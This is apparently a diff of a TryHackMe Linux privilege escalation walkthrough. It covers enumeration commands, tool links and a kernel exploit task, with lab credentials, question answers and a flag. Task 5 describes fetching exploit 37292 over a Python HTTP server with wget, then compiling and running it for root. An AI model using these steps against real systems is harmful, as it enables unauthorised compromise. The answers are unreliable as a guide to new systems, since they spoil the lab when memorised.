@@ -26,8 +26,9 @@ It's rare when performing a real-world penetration test to be able to gain a foo
 # Task 3 Enumeration
 Note: Launch the target machine attached to this task to follow along.You can launch the target machine and access it directly from your browser. Alternatively, you can access it over SSH with the low-privilege user credentials below:
 
-Username: karen
-Password: Password1
+      Username: karen
+      Password: Password1
+
 Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.
 ## hostname
 The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).
@@ -46,14 +47,19 @@ The ps command is an effective way to see the running processes on a Linux syste
 The output of the ps (Process Status) will show the following;
 
   • `PID`: The process ID (unique to the process)
+  
   • `TTY`: Terminal type used by the user
+  
   • `Time`: Amount of CPU time used by the process (this is NOT the time this process has been running for)
+  
   • `CMD`: The command or executable running (will NOT display any command line parameter)
 
 The “ps” command provides a few useful options.
 
   • `ps -A`: View all running processes
+  
   • `ps axjf`: View process tree (see the tree formation until ps axjf is run below)
+  
   • `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.
 
 ## env
@@ -81,9 +87,13 @@ The target system may be a pivoting point to another network. The `ifconfig` com
 Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.
 
    • `netstat -a`: shows all listening ports and established connections.
+   
    • `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
+   
    • `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below) 
+   
    • `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol. 
+   
    • `netstat -tp`: list connections with the service name and PID information.
 
 This can also be used with the `-l` option to list listening ports (below). We can see the “PID/Program name” column is empty as this process is owned by another user.
@@ -94,7 +104,9 @@ Below is the same command run with root privileges and reveals this information 
 The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;
 
    • `-a`: Display all sockets
+   
    • `-n`: Do not resolve names
+   
    • `-o`: Display timers
 
 ##  find Command
@@ -104,31 +116,46 @@ Below are some useful examples for the “find” command.
 Find files:
 
    • `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
+   
    • `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
+
    • `find / -type d -name config`: find the directory named config under “/”
+   
    • `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
+   
    • `find / -perm a=x`: find executable files
+   
    • `find /home -user frank`: find all files for user “frank” under “/home”
+   
    • `find / -mtime 10`: find files that were modified in the last 10 days
+   
    • `find / -atime 10`: find files that were accessed in the last 10 day
+   
    • `find / -cmin -60`: find files changed within the last hour (60 minutes)
+   
    • `find / -amin -60`: find files accesses within the last hour (60 minutes)
+   
    • `find / -size 50M`: find files with a 50 MB size
 
 This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size. 
 Folders and files that can be written to or executed from:
 
    • `find / -writable -type d 2>/dev/null` : Find world-writeable folders
+   
    • `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
+   
    • `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
 
 The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works. 
+
    • `find / -perm -o x -type d 2>/dev/null`: Find world-executable folders
 
 Find development tools and supported languages:
 
    • `find / -name perl*`
+   
    • `find / -name python*`
+   
    • `find / -name gcc*`
 
 Find specific file permissions: 
@@ -140,7 +167,7 @@ General Linux Commands
 As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, etc.
 
 ## Answer the questions below
-# What is the hostname of the target system?  `wade7363`
+What is the hostname of the target system?  `wade7363`
 ```
 root@ip-10-10-143-69:~# ssh karen@10.10.158.74
 The authenticity of host '10.10.158.74 (10.10.158.74)' can't be established.
@@ -154,32 +181,38 @@ wade7363
 $ uname -a
 Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
 ```
-# What is the Linux kernel version of the target system?  `3.13.0-24-generic`
+What is the Linux kernel version of the target system?  `3.13.0-24-generic`
 
-# What Linux is this? We can use the `cat /etc/issue` command to find the operating system version. `Ubuntu 14.04 LTS`
+What Linux is this? We can use the `cat /etc/issue` command to find the operating system version. `Ubuntu 14.04 LTS`
 
-# What version of the Python language is installed on the system? Run the `python --version` command to see which version is installed. `2.7.6`
+What version of the Python language is installed on the system? Run the `python --version` command to see which version is installed. `2.7.6`
 ```
 $ python
 Python 2.7.6 (default, Mar 22 2014, 22:59:56) 
 ```
-# What vulnerability seem to affect the kernel of the target system? (Enter a CVE number), did some external reseach `CVE-2015-1328`
+What vulnerability seem to affect the kernel of the target system? (Enter a CVE number), did some external reseach `CVE-2015-1328`
 
 # Task 4 Automated Enumeration Tools
 Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.
 
 The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.
 
-   • LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-   • LinEnum: https://github.com/rebootuser/LinEnum
-   • LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
-   • Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
-   • Linux Priv Checker: https://github.com/linted/linuxprivchecker 
+    • LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+    • LinEnum: https://github.com/rebootuser/LinEnum
+    • LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+    • Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+    • Linux Priv Checker: https://github.com/linted/linuxprivchecker 
 
 # Answer the questions below
 Install and try a few automated enumeration tools on your local Linux distribution. `No answer needed`
 
-# Task 5 Privilege Escalation:Kernel Exploits
+# Task 5 Privilege Escalation: Kernel Exploits
+Note: Launch the target machine attached to this task to follow along.You can launch the target machine and access it directly from your browser.
+
+    Username: Karen
+    Password: Password1
+
+Alternatively, you can access it over SSH with the low-privilege user credentials below:
 Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.
 
 Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.
@@ -188,37 +221,43 @@ The kernel on Linux systems manages the communication between components such as
 
 The Kernel exploit methodology is simple;
 
-   1. Identify the kernel version
-   2. Search and find an exploit code for the kernel version of the target system
-   3. Run the exploit 
+    1. Identify the kernel version
+    2. Search and find an exploit code for the kernel version of the target system
+    3. Run the exploit 
 
 Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.
 ## Research sources:
 
-   1. Based on your findings, you can use Google to search for an existing exploit code.
-   2. Sources such as https://www.linuxkernelcves.com/cves can also be useful.
-   3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
+    1. Based on your findings, you can use Google to search for an existing exploit code.
+    2. Sources such as https://www.linuxkernelcves.com/cves can also be useful.
+    3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
 
 ## Hints/Notes:
 
-   1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
-   2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
-   3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
-   4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.
+    1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
+    2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that 
+    would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great 
+    concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
+    3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
+    4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.
 
 # Answer the questions below
 find and use the appropriate kernel exploit to gain root privileges on the target system.`No answer needed`
 
-  1. Identify the kernel version.
-
-  2. Search and find an exploit code for the kernel version of the target system.
-This we can find with some quick Googling. Download the exploit and move it into your `/tmp` folder.We can also get it via `searchploit`.
-  3. 3. Run the exploit.Open up the terminal on your local machine, and start up the machine in Attackbox. In Attackbox, let's run the id command and take note of our current user privilege.On your local machine, we need to start up a python server so that we can send our downloaded exploit to our target machine in Attackbox. We can do this via the `python3 -m http.server 8000` command. Don't close this terminal.Open up a new tab/terminal so that we can get the IP address of our local machine. We need this to connect to our target machine. Use the `ifconfig` command and scroll down.
-Cool, now we can go ahead and send our exploit that we downloaded and stored in our /tmp file to our target machine. Go to your Attackbox and first cd into your /tmp folder before connecting to your local machine. If you don't cd into /tmp first then you will get an error when trying to connect. Now, to send the exploit and make a connection we can enter the following command (replace the IP with your ifconfig IP) `wget http://yourip:8000/37292.c`.Okay, the exploit is sent. Now to convert it, we can enter the following command `gcc 37292.c -o pwned`. With our exploit converted, we can run it via the `./pwned` command.
-
-# What is the content of the flag1.txt file? 
-
-
+    1. Researched the Linuxer kernel 3.13 exploit 37292 based on last section. Download the exploit, rename file to `exploit.c`.
+    2. Navigate to the directroy you want to have the root directory `ssh karen@ip`
+    3. Execute commond in another command prompt `python3 -m http:server 8000`
+![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/c812ac64-7409-4485-9f61-aee67958741e)
+    4. Then navigate a web browser- `http://localhost:8000. Make sure the file you want to upload to the target is listed on the server. 
+    ![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/4b0e7254-08c7-4c88-b342-8bd7f60aba6e)
+    
+    5. LinuxKernel VM, type `ls -al`
+    ![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/bbad39c9-00b2-4213-8255-874294c1d933)
+    6. cd to tmp folder and from there you can run wget command without any issue. After the file is downloaded follow the compile commands from the screenshot and the file will exploit the kernel. Congrats! Now you are the root!
+    ![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/c764bbe8-693d-4b36-bf33-d89edc63b3fc)
+    7.To get the flag cd to /home/matt and cat flag1.txt. The Task is completed!
+    ![image](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/bad4bbd8-5005-4c9c-8252-d637d7bc7512)
+What is the content of the flag1.txt file? `THM-28392872729920`
 
 # Task 6 Privilege Escalation: Sudo
 
